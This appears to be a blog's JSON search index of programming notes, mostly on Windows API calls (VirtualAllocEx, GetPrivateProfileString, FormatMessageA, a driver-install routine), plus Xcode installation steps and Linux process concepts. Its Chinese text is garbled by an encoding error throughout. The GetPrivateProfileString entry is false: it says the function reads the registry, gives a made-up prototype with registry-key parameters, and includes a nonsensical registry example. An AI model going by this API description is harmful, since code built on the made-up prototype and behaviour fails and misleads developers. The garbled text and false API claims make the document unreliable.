&quot;é©±åŠ¨å®‰è£…è¿›ç¨‹å·²å¯åŠ¨ï¼&quot;; // ç­‰å¾…è¿›ç¨‹ç»“æŸ WaitForSingleObject(ShExecInfoInstall.hProcess, INFINITE); // è·å–é€€å‡ºä»£ç  DWORD exitCode; if (GetExitCodeProcess(ShExecInfoInstall.hProcess, &amp;exitCode)) &#123; // åˆ¤æ–­è¿›ç¨‹æ˜¯å¦æˆåŠŸé€€å‡º if (exitCode != STILL_ACTIVE) &#123; QLOG_INFO() &lt;&lt; &quot;é©±åŠ¨å®‰è£…è¿›ç¨‹å·²é€€å‡ºï¼Œé€€å‡ºä»£ç : &quot; &lt;&lt; exitCode; &#125; else &#123; QLOG_INFO() &lt;&lt; &quot;é©±åŠ¨å®‰è£…è¿›ç¨‹æœªèƒ½æ­£å¸¸é€€å‡ºï¼Œé€€å‡ºä»£ç : &quot; &lt;&lt; exitCode; &#125; &#125; else &#123; QLOG_INFO() &lt;&lt; &quot;è·å–é©±åŠ¨å®‰è£…è¿›ç¨‹é€€å‡ºä»£ç å¤±è´¥ï¼é”™è¯¯ä»£ç : &quot; &lt;&lt; GetLastError(); &#125; // å®æµ‹ 1å’Œ0 çš„æ—¶å€™å®‰è£…æˆåŠŸ bRes = exitCode == 1 || exitCode == 0 ? true : false; // å…³é—­å¥æŸ„ CloseHandle(ShExecInfoInstall.hProcess); &#125; else &#123; QLOG_ERROR() &lt;&lt; &quot;å¯åŠ¨é©±åŠ¨å®‰è£…è¿›ç¨‹å¤±è´¥ï¼é”™è¯¯ä»£ç : &quot; &lt;&lt; GetLastError(); &#125; &#125; catch (const std::exception&amp; e) &#123; QLOG_ERROR() &lt;&lt; __FUNCTION__ &lt;&lt; __LINE__ &lt;&lt; e.what(); bEnd = true; return bOptRt; &#125; bEnd = true; return bOptRt;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"winapi","slug":"winapi","permalink":"https://hodlyounger.github.io/tags/winapi/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€winapiã€‘VitualAlloc","date":"2023-10-27T01:24:01.940Z","path":"A_OS/Windows/API/ã€winapiã€‘VirtualAlloc/","text":"æ¦‚è¿°ï¼šVirtualAlloc å‡½æ•°è¯¦è§£ è¯´æ˜ ä½œç”¨ï¼šåœ¨æŒ‡å®šè¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ä¿ç•™ã€æäº¤æˆ–æ›´æ”¹å†…å­˜åŒºåŸŸçš„çŠ¶æ€ã€‚è¯¥å‡½æ•°å°†å®ƒåˆ†é…çš„å†…å­˜åˆå§‹åŒ–ä¸ºé›¶ã€‚ å®˜æ–¹æ–‡æ¡£ï¼šVirtualAllocEx å‡½æ•° (memoryapi.h) - Win32 apps | Microsoft Learn å‡½æ•°åŸå‹ï¼š 1234567LPVOID VirtualAllocEx( [in] HANDLE hProcess, [in, optional] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD flAllocationType, [in] DWORD flProtect); å‚æ•°è¯´æ˜ï¼š hProcess: è¿›ç¨‹çš„å¥æŸ„ lpAddress: è¦åˆ†é…å†…å­˜å—çš„èµ·å§‹åœ°å€çš„æŒ‡é’ˆ dwSize: è¦åˆ†é…å†…å­˜å—çš„å¤§å° flAllocationTypeï¼šå†…å­˜åˆ†é…çš„ç±»å‹ å€¼ å«ä¹‰ MEM_COMMIT0x00001000 ä»æŒ‡å®šä¿ç•™å†…å­˜é¡µçš„ç£ç›˜) çš„æ€»å†…å­˜å¤§å°å’Œåˆ†é¡µæ–‡ä»¶ (åˆ†é…å†…å­˜è´¹ç”¨ã€‚ å‡½æ•°è¿˜ä¿è¯å½“è°ƒç”¨æ–¹ç¨åæœ€åˆè®¿é—®å†…å­˜æ—¶ï¼Œå†…å®¹å°†ä¸ºé›¶ã€‚ é™¤éå®é™…è®¿é—®è™šæ‹Ÿåœ°å€ï¼Œå¦åˆ™ä¸ä¼šåˆ†é…å®é™…ç‰©ç†é¡µé¢ã€‚è‹¥è¦åœ¨ä¸€ä¸ªæ­¥éª¤ä¸­ä¿ç•™å’Œæäº¤é¡µé¢ï¼Œè¯·ä½¿ç”¨ `MEM_COMMIT MEM_RESERVE0x00002000 ä¿ç•™è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´èŒƒå›´ï¼Œè€Œæ— éœ€åœ¨å†…å­˜æˆ–ç£ç›˜ä¸Šçš„åˆ†é¡µæ–‡ä»¶ä¸­åˆ†é…ä»»ä½•å®é™…ç‰©ç†å­˜å‚¨ã€‚ä½¿ç”¨ MEM_COMMIT å†æ¬¡è°ƒç”¨ VirtualAllocEx æ¥æäº¤ä¿ç•™é¡µã€‚ è‹¥è¦åœ¨ä¸€ä¸ªæ­¥éª¤ä¸­ä¿ç•™å’Œæäº¤é¡µé¢ï¼Œè¯·ä½¿ç”¨ `MEM_COMMIT MEM_RESET0x00080000 æŒ‡ç¤º lpAddress å’Œ dwSize æŒ‡å®šçš„å†…å­˜èŒƒå›´ä¸­çš„æ•°æ®ä¸å†æ„Ÿå…´è¶£ã€‚ ä¸åº”ä»åˆ†é¡µæ–‡ä»¶è¯»å–æˆ–å†™å…¥é¡µé¢ã€‚ ä½†æ˜¯ï¼Œå†…å­˜å—ç¨åå°†å†æ¬¡ä½¿ç”¨ï¼Œå› æ­¤ä¸åº”å–æ¶ˆæäº¤ã€‚ æ­¤å€¼ä¸èƒ½ä¸ä»»ä½•å…¶ä»–å€¼ä¸€èµ·ä½¿ç”¨ã€‚ä½¿ç”¨æ­¤å€¼å¹¶ä¸èƒ½ä¿è¯ä½¿ç”¨ MEM_RESET æ“ä½œçš„èŒƒå›´å°†åŒ…å«é›¶ã€‚ å¦‚æœå¸Œæœ›èŒƒå›´åŒ…å«é›¶ï¼Œè¯·å–æ¶ˆæäº¤å†…å­˜ï¼Œç„¶åé‡æ–°æäº¤ã€‚ä½¿ç”¨ MEM_RESET æ—¶ï¼Œ VirtualAllocEx å‡½æ•°ä¼šå¿½ç•¥ fProtect çš„å€¼ã€‚ ä½†æ˜¯ï¼Œä»å¿…é¡»å°† fProtect è®¾ç½®ä¸ºæœ‰æ•ˆçš„ä¿æŠ¤å€¼ï¼Œä¾‹å¦‚ PAGE_NOACCESSã€‚å¦‚æœä½¿ç”¨ MEM_RESETå¹¶ä¸”å†…å­˜èŒƒå›´æ˜ å°„åˆ°æ–‡ä»¶ï¼ŒVirtualAllocEx å°†è¿”å›é”™è¯¯ã€‚ ä»…å½“å…±äº«è§†å›¾æ˜ å°„åˆ°åˆ†é¡µæ–‡ä»¶æ—¶ï¼Œæ‰å¯æ¥å—è¯¥è§†å›¾ã€‚ MEM_RESET_UNDO0x1000000 åº” ä»…å¯¹ä¹‹å‰æˆåŠŸåº”ç”¨MEM_RESETçš„åœ°å€èŒƒå›´è°ƒç”¨ MEM_RESET_UNDO ã€‚ å®ƒæŒ‡ç¤ºè°ƒç”¨æ–¹å¯¹ lpAddress å’Œ dwSize æŒ‡å®šçš„æŒ‡å®šå†…å­˜èŒƒå›´ä¸­çš„æ•°æ®æ„Ÿå…´è¶£ï¼Œå¹¶å°è¯•åè½¬ MEM_RESETçš„å½±å“ã€‚ å¦‚æœè¯¥å‡½æ•°æˆåŠŸï¼Œåˆ™è¡¨ç¤ºæŒ‡å®šåœ°å€èŒƒå›´ä¸­çš„æ‰€æœ‰æ•°æ®éƒ½ä¿æŒä¸å˜ã€‚ å¦‚æœå‡½æ•°å¤±è´¥ï¼Œåˆ™è‡³å°‘å°†åœ°å€èŒƒå›´ä¸­çš„æŸäº›æ•°æ®æ›¿æ¢ä¸ºé›¶ã€‚æ­¤å€¼ä¸èƒ½ä¸ä»»ä½•å…¶ä»–å€¼ä¸€èµ·ä½¿ç”¨ã€‚ å¦‚æœåœ¨ä¹‹å‰æœªMEM_RESETçš„åœ°å€èŒƒå›´ä¸Šè°ƒç”¨MEM_RESET_UNDOï¼Œåˆ™è¡Œä¸ºæœªå®šä¹‰ã€‚ æŒ‡å®š MEM_RESETæ—¶ï¼Œ VirtualAllocEx å‡½æ•°å°†å¿½ç•¥ flProtect çš„å€¼ã€‚ ä½†æ˜¯ï¼Œä»å¿…é¡»å°† flProtect è®¾ç½®ä¸ºæœ‰æ•ˆçš„ä¿æŠ¤å€¼ï¼Œä¾‹å¦‚ PAGE_NOACCESSã€‚Windows Server 2008 R2ã€Windows 7ã€Windows Server 2008ã€Windows Vistaã€Windows Server 2003 å’Œ Windows XPï¼š åœ¨ Windows 8 å’Œ Windows Server 2012 ä¹‹å‰ï¼Œä¸æ”¯æŒ MEM_RESET_UNDO æ ‡å¿—ã€‚ flProtectï¼š è¦åˆ†é…çš„é¡µåŒºåŸŸçš„å†…å­˜ä¿æŠ¤ã€‚ä¸€èˆ¬ä½¿ç”¨ PAGE_EXeCUTE_READWRITEï¼Œè¯¦è§æ¯æ¬¡ä¿æŠ¤å¸¸é‡ (WinNT.h) - Win32 apps | Microsoft Learn ç¤ºä¾‹ å¦‚ä¸‹æ‰€ç¤ºä¸ºåœ¨ç›®æ ‡è¿›ç¨‹çš„å†…å­˜åŒºåŸŸä¸­ä» 0 å¼€å§‹ç”³è¯·å¤§å°ä¸º 4096 çš„å†…å­˜å—ï¼Œæƒé™ä¸ºå¯è¯»å¯å†™ç›®æ ‡å†…å­˜åŒºåŸŸçš„æƒé™ä¸ºå¯è¯»å¯å†™ï¼ŒhTarget ä¸ºç›®æ ‡è¿›ç¨‹å¥æŸ„ï¼š 123456789// åœ¨ç›®æ ‡è¿›ç¨‹ç”³è¯·å†…å­˜void* pLoadLibFuncParam = nullptr;pLoadLibFuncParam = VirtualAllocEx(hTarget, 0, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);if (pLoadLibFuncParam == nullptr)&#123; cout &lt;&lt; &quot;alloc memery failed&quot; &lt;&lt; endl; CloseHandle(hTarget); return 0;&#125; ç¬¬å››ä¸ªå‚æ•°å¸¸ç”¨ MEM_COMMIT | MEM_RESERVE","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"API","slug":"API","permalink":"https://hodlyounger.github.io/tags/API/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€winapiã€‘GetPrivateProfileString ç”¨æ³•","date":"2023-10-27T01:24:01.939Z","path":"A_OS/Windows/API/ã€winapiã€‘GetPrivageProfileString/","text":"æ¦‚è¿°ï¼šGetPrivateProfileStringçš„ä½¿ç”¨ GetPrivateProfileString ç”¨æ³• GetPrivateProfileStringæ˜¯Windows APIä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒç”¨äºä»æ³¨å†Œè¡¨è¯»å–æŒ‡å®šé”®å€¼å¯¹çš„å­—ç¬¦ä¸²å€¼ã€‚ è¯¥å‡½æ•°çš„åŸå‹ä¸º 1234567DWORD GetPrivateProfileString( HKEY hKey, LPCTSTR lpStringName, LPCTSTR lpStringValue, DWORD dwReserved, LPDWORD lpdwResult ); å…¶ä¸­ï¼ŒhKeyè¡¨ç¤ºè¦è¯»å–çš„æ³¨å†Œè¡¨é”®ï¼ŒlpStringNameè¡¨ç¤ºè¦è¯»å–çš„é”®çš„åç§°ï¼ŒlpStringValueè¡¨ç¤ºè¦è¯»å–çš„é”®çš„å€¼ï¼ŒdwReservedè¡¨ç¤ºä¿ç•™å­—æ®µï¼ŒlpdwResultè¡¨ç¤ºè¿”å›ç»“æœçš„ç¼“å†²åŒºã€‚ è¯»å–æ³¨å†Œè¡¨ è°ƒç”¨è¯¥å‡½æ•°å¯ä»¥ä»æ³¨å†Œè¡¨è¯»å–æŒ‡å®šé”®å€¼å¯¹çš„å­—ç¬¦ä¸²å€¼ï¼Œä¾‹å¦‚: 123456789101112HKEY hKey; LPCTSTR lpStringName = &quot;MyString&quot;; LPCTSTR lpStringValue = &quot;MyValue&quot;; DWORD dwReserved = 0; LPDWORD lpdwResult = NULL; GetPrivateProfileString(HKEY_CURRENT_USER, lpStringName, lpStringValue, 0, &amp;dwReserved, (LPDWORD)&amp;lpdwResult); if (lpdwResult != NULL) &#123; // å¤„ç†è¯»å–æˆåŠŸçš„ä¿¡æ¯ &#125; else &#123; // å¤„ç†è¯»å–å¤±è´¥çš„ä¿¡æ¯ &#125; åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä»æ³¨å†Œè¡¨è¯»å–äº†åä¸º&quot;MyString&quot;çš„é”®çš„å€¼ï¼Œå¹¶å°†ç»“æœå­˜å‚¨åœ¨lpdwResultä¸­ã€‚å¦‚æœè¯»å–æˆåŠŸï¼Œåˆ™lpdwResultéNULL,å¦åˆ™lpdwResultä¸ºNULLã€‚ è¯»å†™é…ç½®æ–‡ä»¶ è¯»å†™æ–‡ä»¶æµ‹è¯•ï¼Œåˆ›å»ºtest.iniæ–‡ä»¶å†™å…¥ä¸€ä¸‹å†…å®¹ 123456[NETWORK]ServerIP=127.0.0.1LocalHost=www.baidu.com[NETSET]Net=443NetHost=8080 è¯»å–é…ç½®æ–‡ä»¶ 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;windows.h&gt; //è¿™ä¸ªå¤´æ–‡ä»¶ä¸€å®šè¦æ·»åŠ ï¼Œå¦åˆ™GetPrivateProfileString(...)å‡½æ•°æ— æ³•ä½¿ç”¨ using namespace std; void main() &#123; char ip[16]; char add[20]; char net[20]; char set[20]; DWORD num;//longç±»å‹ï¼Œå¯ä»¥çœç•¥ä¸å†™ï¼Œå¦‚ä¸‹å‡ è¡Œã€‚ num = GetPrivateProfileString(&quot;NETWORK&quot;, &quot;ServerIP&quot;, &quot;&quot;, ip, sizeof(ip), &quot;\\C:\\\\test.ini&quot;); GetPrivateProfileString(&quot;NETWORK&quot;, &quot;LocalHost&quot;, &quot;&quot;, add, sizeof(add), &quot;C:\\\\test.ini&quot;); GetPrivateProfileString(&quot;NETSET&quot;, &quot;Net&quot;, &quot;&quot;, net, sizeof(net), &quot;C:\\\\test.ini&quot;); GetPrivateProfileString(&quot;NETSET&quot;, &quot;NetHost&quot;, &quot;&quot;, set, sizeof(set), &quot;e:\\\\test.ini&quot;); cout &lt;&lt; num &lt;&lt; endl; cout &lt;&lt; &quot;-----------------\\n&quot;; cout &lt;&lt; ip &lt;&lt; endl; cout &lt;&lt; add &lt;&lt; endl; cout &lt;&lt; net &lt;&lt; endl; cout &lt;&lt; set &lt;&lt; endl; cout &lt;&lt; &quot;------------\\n&quot;; system(&quot;pause&quot;);&#125; å†™å…¥é…ç½®æ–‡ä»¶ è¿è¡Œç¨‹åºåï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š 12345678[NETWORK]ServerIP=127.0.0.1LocalHost=www.baidu.com[NETSET]Net=443NetHost=8080[Device]Name=PC è¿è¡Œdemoï¼š 1234567891011#include &lt;iostream&gt;#include &lt;windows.h&gt;//è¿™ä¸ªå¤´æ–‡ä»¶ä¸€å®šè¦æ·»åŠ ï¼Œå¦åˆ™GetPrivateProfileString(...)å‡½æ•°æ— æ³•ä½¿ç”¨ using namespace std; void main() &#123; WritePrivateProfileString(&quot;Device&quot;, &quot;Name&quot;, &quot;PC&quot;, &quot;C:\\\\test.ini&quot;); system(&quot;pause&quot;);&#125;","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"API","slug":"API","permalink":"https://hodlyounger.github.io/tags/API/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€winapiã€‘FormatMessageA","date":"2023-10-27T01:24:01.938Z","path":"A_OS/Windows/API/ã€winapiã€‘FormatMessageA/","text":"æ¦‚è¿°ï¼šè·å–é”™è¯¯ç å¯¹åº”çš„æè¿° 1234567891011121314151617181920212223242526272829string get_sys_error_msg(unsigned long err)&#123; char _inner_msg[10240] = &#123; 0 &#125;; memset(_inner_msg, 0, sizeof(_inner_msg)); if (err == 0) err = GetLastError(); LPSTR buf = NULL; if (::FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, err, MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), (LPSTR)&amp;buf, 0, NULL)) &#123; sprintf_s(_inner_msg, sizeof(_inner_msg),&quot;[%d]%s&quot;, err, buf); ::LocalFree(buf); &#125; else &#123; snprintf(_inner_msg, sizeof(_inner_msg), &quot; [0x%x]Unknown error&quot;, err); &#125; string str_error_msg(_inner_msg); return str_error_msg;&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"Xcode ä¸‹è½½ä¸å®‰è£…","date":"2023-10-27T01:24:01.936Z","path":"A_OS/Mac/Xcode/","text":"ä¸‹è½½åå¾—åˆ° xip æ–‡ä»¶ å¦‚ ï¼š Xcode_13.xip å¯ä»¥ä½¿ç”¨è§£å‹ç¼©è½¯ä»¶è¿›è¡Œè§£å‹ï¼Œå¦‚æœæœ‰äº›å‹ç¼©è½¯ä»¶ä¸æ”¯æŒä¼šæç¤ºç ´æŸï¼Œå¯ä»¥è€ƒè™‘ç›´æ¥åœ¨å‘½ä»¤è¡Œè§£å‹ã€‚ ç¬¬ä¸€æ­¥ï¼šcd åˆ°ä¸‹è½½çš„ç›®å½• ç¬¬äºŒæ­¥ï¼šxip -x Xcode_13.xip æ­¤æ—¶ï¼Œä¼šæœ‰ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„æç¤ºï¼Œä¼šè¯¯ä»¥ä¸ºæŠ¥é”™ã€‚ xip: signing certificate was â€œSoftware Updateâ€ (validation not attempted) ä¸»è¦æ˜¯ xcode æ–‡ä»¶å¤ªå¤§å¯¼è‡´çš„ï¼Œå¯ä»¥è€å¿ƒå¤šç­‰å¾…å‡ åˆ†é’Ÿï¼Œå°†ä¼šæ”¶åˆ°ä»¥ä¸‹ä¿¡æ¯ï¼š xip: expanded items from â€œ/Users/ivychen/Documents/Xcode_13.xipâ€ å°†å¾—åˆ° Xcode ç¨‹åºæ–‡ä»¶ï¼Œå°†å…¶æ‹–åŠ¨åˆ°è®¿è¾¾çš„ Application æ–‡ä»¶å¤¹å³å¯ã€‚","tags":[{"name":"OS/Mac","slug":"OS-Mac","permalink":"https://hodlyounger.github.io/tags/OS-Mac/"},{"name":"Xcode","slug":"Xcode","permalink":"https://hodlyounger.github.io/tags/Xcode/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Mac","slug":"A-OS/Mac","permalink":"https://hodlyounger.github.io/categories/A-OS/Mac/"}]},{"title":"Linux è¿›ç¨‹ç®¡ç†","date":"2023-10-27T01:24:01.894Z","path":"A_OS/Linux/æ“ä½œç³»ç»ŸåŠLinuxå†…æ ¸/6 Linuxè¿›ç¨‹ç®¡ç†/","text":"æŸ¥çœ‹è¿›ç¨‹çš„è¿è¡ŒçŠ¶æ€ è¿›ç¨‹çš„ç»“æŸæ§åˆ¶ è¿›ç¨‹çš„æ‰§è¡Œé¡ºåº [toc] 1 è¿›ç¨‹çš„æŸ¥çœ‹ ä¸ç®¡åœ¨æµ‹è¯•çš„æ—¶å€™ã€åœ¨å®é™…çš„ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œè¿˜æ˜¯è‡ªå·±çš„ä½¿ç”¨è¿‡ç¨‹ä¸­ï¼Œéš¾å…ä¼šé‡åˆ°ä¸€äº›è¿›ç¨‹å¼‚å¸¸çš„æƒ…å†µï¼Œæ‰€ä»¥ Linux ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€äº›å·¥å…·æ¥æŸ¥çœ‹è¿›ç¨‹çš„çŠ¶æ€ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ top å®æ—¶çš„æŸ¥çœ‹è¿›ç¨‹çš„çŠ¶æ€ï¼Œä»¥åŠç³»ç»Ÿçš„ä¸€äº›ä¿¡æ¯ï¼ˆå¦‚ CPUã€å†…å­˜ä¿¡æ¯ç­‰ï¼‰ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡ ps æ¥é™æ€æŸ¥çœ‹å½“å‰çš„è¿›ç¨‹ä¿¡æ¯ï¼ŒåŒæ—¶æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ pstree æ¥æŸ¥çœ‹å½“å‰æ´»è·ƒè¿›ç¨‹çš„æ ‘å½¢ç»“æ„ã€‚ 1.1 topå·¥å…·çš„ä½¿ç”¨","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"è¿›ç¨‹","slug":"è¿›ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E8%BF%9B%E7%A8%8B/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"æ“ä½œç³»ç»ŸåŠLinuxå†…æ ¸","slug":"A-OS/Linux/æ“ä½œç³»ç»ŸåŠLinuxå†…æ ¸","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8F%8ALinux%E5%86%85%E6%A0%B8/"}]},{"title":"ã€Linuxã€‘è¿›ç¨‹æ¦‚å¿µ","date":"2023-10-27T01:24:01.892Z","path":"A_OS/Linux/æ“ä½œç³»ç»ŸåŠLinuxå†…æ ¸/5 Linuxè¿›ç¨‹æ¦‚å¿µ/","text":"è¿›ç¨‹ä¸ç¨‹åº è¿›ç¨‹çš„è¡ç”Ÿ å·¥ä½œç®¡ç† [toc] 1 æ¦‚å¿µç†è§£ é¦–å…ˆç¨‹åºä¸è¿›ç¨‹æ˜¯ä»€ä¹ˆï¼Ÿç¨‹åºä¸è¿›ç¨‹åˆæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ ç¨‹åºï¼ˆprocedureï¼‰ï¼šä¸å¤ªç²¾ç¡®åœ°è¯´ï¼Œç¨‹åºå°±æ˜¯æ‰§è¡Œä¸€ç³»åˆ—æœ‰é€»è¾‘ã€æœ‰é¡ºåºç»“æ„çš„æŒ‡ä»¤ï¼Œå¸®æˆ‘ä»¬è¾¾æˆæŸä¸ªç»“æœã€‚å°±å¦‚æˆ‘ä»¬å»é¤é¦†ï¼Œç»™æœåŠ¡å‘˜è¯´æˆ‘è¦ç‰›è‚‰ç›–æµ‡é¥­ï¼Œå¥¹æ‰§è¡Œäº†åšç‰›è‚‰ç›–æµ‡é¥­è¿™ä¹ˆä¸€ä¸ªç¨‹åºï¼Œæœ€åæˆ‘ä»¬å¾—åˆ°äº†è¿™ä¹ˆä¸€ç›˜ç‰›è‚‰ç›–æµ‡é¥­ã€‚å®ƒéœ€è¦å»æ‰§è¡Œï¼Œä¸ç„¶å®ƒå°±åƒä¸€æœ¬æ­¦åŠŸç§˜ç±ï¼Œæ”¾åœ¨é‚£é‡Œç­‰äººç¿»çœ‹ã€‚ è¿›ç¨‹ï¼ˆprocessï¼‰ï¼šè¿›ç¨‹æ˜¯ç¨‹åºåœ¨ä¸€ä¸ªæ•°æ®é›†åˆä¸Šçš„ä¸€æ¬¡æ‰§è¡Œè¿‡ç¨‹ï¼Œåœ¨æ—©æœŸçš„UNIXã€Linux 2.4åŠæ›´æ—©çš„ç‰ˆæœ¬ä¸­ï¼Œå®ƒæ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºåˆ†é…å’Œè°ƒåº¦çš„ç‹¬ç«‹åŸºæœ¬å•ä½ã€‚åŒä¸Šä¸€ä¸ªä¾‹å­ï¼Œå°±å¦‚æˆ‘ä»¬å»äº†é¤é¦†ï¼Œç»™æœåŠ¡å‘˜è¯´æˆ‘è¦ç‰›è‚‰ç›–æµ‡é¥­ï¼Œå¥¹æ‰§è¡Œäº†åšç‰›è‚‰ç›–æµ‡é¥­è¿™ä¹ˆä¸€ä¸ªç¨‹åºï¼Œè€Œé‡Œé¢åšé¥­çš„æ˜¯ä¸€ä¸ªè¿›ç¨‹ï¼Œåšç‰›è‚‰æ±¤æ±çš„æ˜¯ä¸€ä¸ªè¿›ç¨‹ï¼ŒæŠŠç‰›è‚‰æ±¤æ±ä¸é¥­æ··åˆåœ¨ä¸€èµ·çš„æ˜¯ä¸€ä¸ªè¿›ç¨‹ï¼ŒæŠŠé¥­ç«¯ä¸Šæ¡Œçš„æ˜¯ä¸€ä¸ªè¿›ç¨‹ã€‚å®ƒå°±åƒæ˜¯æˆ‘ä»¬åœ¨çœ‹æ­¦åŠŸç§˜ç±è¿™ä¹ˆä¸€ä¸ªè¿‡ç¨‹ï¼Œç„¶åä¸€ä¸ªç¯‡ç« ä¸€ä¸ªç¯‡ç« åœ°å»ç»ƒã€‚ ç®€å•æ¥è¯´ï¼Œç¨‹åºæ˜¯ä¸ºäº†å®ŒæˆæŸç§ä»»åŠ¡è€Œè®¾è®¡çš„è½¯ä»¶ï¼Œæ¯”å¦‚ vim æ˜¯ç¨‹åºã€‚ä»€ä¹ˆæ˜¯è¿›ç¨‹å‘¢ï¼Ÿè¿›ç¨‹å°±æ˜¯è¿è¡Œä¸­çš„ç¨‹åºã€‚ ç¨‹åºåªæ˜¯ä¸€äº›åˆ—æŒ‡ä»¤çš„é›†åˆï¼Œæ˜¯ä¸€ä¸ªé™æ­¢çš„å®ä½“ï¼Œè€Œè¿›ç¨‹ä¸åŒï¼Œè¿›ç¨‹æœ‰ä»¥ä¸‹çš„ç‰¹æ€§ï¼š åŠ¨æ€æ€§ï¼šè¿›ç¨‹çš„å®è´¨æ˜¯ä¸€æ¬¡ç¨‹åºæ‰§è¡Œçš„è¿‡ç¨‹ï¼Œæœ‰åˆ›å»ºã€æ’¤é”€ç­‰çŠ¶æ€çš„å˜åŒ–ã€‚è€Œç¨‹åºæ˜¯ä¸€ä¸ªé™æ€çš„å®ä½“ã€‚ å¹¶å‘æ€§ï¼šè¿›ç¨‹å¯ä»¥åšåˆ°åœ¨ä¸€ä¸ªæ—¶é—´æ®µå†…ï¼Œæœ‰å¤šä¸ªç¨‹åºåœ¨è¿è¡Œä¸­ã€‚ç¨‹åºåªæ˜¯é™æ€çš„å®ä½“ï¼Œæ‰€ä»¥ä¸å­˜åœ¨å¹¶å‘æ€§ã€‚ ç‹¬ç«‹æ€§ï¼šè¿›ç¨‹å¯ä»¥ç‹¬ç«‹åˆ†é…èµ„æºï¼Œç‹¬ç«‹æ¥å—è°ƒåº¦ï¼Œç‹¬ç«‹åœ°è¿è¡Œã€‚ å¼‚æ­¥æ€§ï¼šè¿›ç¨‹ä»¥ä¸å¯é¢„çŸ¥çš„é€Ÿåº¦å‘å‰æ¨è¿›ã€‚ ç»“æ„æ€§ï¼šè¿›ç¨‹æ‹¥æœ‰ä»£ç æ®µã€æ•°æ®æ®µã€PCBï¼ˆè¿›ç¨‹æ§åˆ¶å—ï¼Œè¿›ç¨‹å­˜åœ¨çš„å”¯ä¸€æ ‡å¿—ï¼‰ã€‚ä¹Ÿæ­£æ˜¯å› ä¸ºæœ‰ç»“æ„æ€§ï¼Œè¿›ç¨‹æ‰å¯ä»¥åšåˆ°ç‹¬ç«‹åœ°è¿è¡Œã€‚ **å¹¶å‘ï¼š**åœ¨ä¸€ä¸ªæ—¶é—´æ®µå†…ï¼Œå®è§‚æ¥çœ‹æœ‰å¤šä¸ªç¨‹åºéƒ½åœ¨æ´»åŠ¨ï¼Œæœ‰æ¡ä¸ç´Šçš„æ‰§è¡Œï¼ˆæ¯ä¸€ç¬é—´åªæœ‰ä¸€ä¸ªåœ¨æ‰§è¡Œï¼Œåªæ˜¯åœ¨ä¸€æ®µæ—¶é—´æœ‰å¤šä¸ªç¨‹åºéƒ½æ‰§è¡Œè¿‡ï¼‰ **å¹¶è¡Œï¼š**åœ¨æ¯ä¸€ä¸ªç¬é—´ï¼Œéƒ½æœ‰å¤šä¸ªç¨‹åºéƒ½åœ¨åŒæ—¶æ‰§è¡Œï¼Œè¿™ä¸ªå¿…é¡»æœ‰å¤šä¸ª CPU æ‰è¡Œ å¼•å…¥è¿›ç¨‹æ˜¯å› ä¸ºä¼ ç»Ÿæ„ä¹‰ä¸Šçš„ç¨‹åºå·²ç»ä¸è¶³ä»¥æè¿° OS 